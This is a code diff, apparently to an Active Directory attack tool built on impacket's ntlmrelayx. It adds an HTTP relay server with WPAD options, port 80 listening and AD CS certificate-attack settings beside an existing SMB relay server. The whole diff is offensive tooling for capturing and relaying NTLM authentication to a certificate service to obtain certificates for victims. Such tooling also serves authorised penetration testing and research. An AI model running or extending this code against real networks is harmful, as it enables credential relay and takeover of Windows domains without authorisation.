@@ -11,6 +11,7 @@ from threading import Lock
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
 from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPRelayClient
 from impacket.examples.ntlmrelayx.servers import SMBRelayServer
+from impacket.examples.ntlmrelayx.servers import HTTPRelayServer  				#// Added for the HTTP Relay server
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
@@ -379,6 +380,9 @@ class Relay:
         out=None,
         interface="0.0.0.0",
         port=445,
+        http_port=80, 				#// Added to set specific port for HTTP so we can print that we're listening on 80 later
+        wpad_host="0.0.0.0", 			#// Set a value for the wpad host as local
+        wpad_auth_num=1, 			#// Configure enabling WPAD authentication
         forever=False,
         no_skip=False,
         timeout=5,
@@ -399,6 +403,9 @@ class Relay:
         self.interface = interface
         self.port = port
         self.kwargs = kwargs
+        self.http_port = http_port 		#// Setting 'self.http_port to the http_port variable
+        self.wpad_host = wpad_host 		#// Setting 'self.wpad_host' to the wpad_host variable
+        self.wpad_auth_num = wpad_auth_num 	#// Setting 'self.wpad_auth_num' to the wpad_auth_num variable
 
         self.attacked_targets = []
         self.attack_lock = Lock()
@@ -423,10 +430,28 @@ class Relay:
 
         self.server = SMBRelayServer(config)
 
+#// Setup HTTP relay config
+
+        httpConfig = NTLMRelayxConfig()
+        httpConfig.setTargets(target)
+        httpConfig.setIsADCSAttack(True)
+        httpConfig.setADCSOptions(self.template)
+        httpConfig.setAttacks({"HTTP": self.get_attack_client})
+        httpConfig.setProtocolClients({"HTTP": self.get_relay_server})
+        httpConfig.setInterfaceIp(interface)
+        httpConfig.setSMB2Support(True)
+        httpConfig.setMode("RELAY")  
+        httpConfig.setWpadOptions(wpad_host, wpad_auth_num)
+        httpConfig.setListeningPort(http_port)
+        
+        self.httpServer = HTTPRelayServer(httpConfig)
+
     def start(self):
         logging.info("Listening on %s:%d" % (self.interface, self.port))
+        logging.info("HTTP Listening on %s:%d" % (self.interface, self.http_port)) #// Added to print that we're listening on HTTP	#//Print port 80 listener
 
         self.server.start()
+        self.httpServer.start() 		#// Added to start HTTP server to listen for incoming connections
 
         try:
             while True:
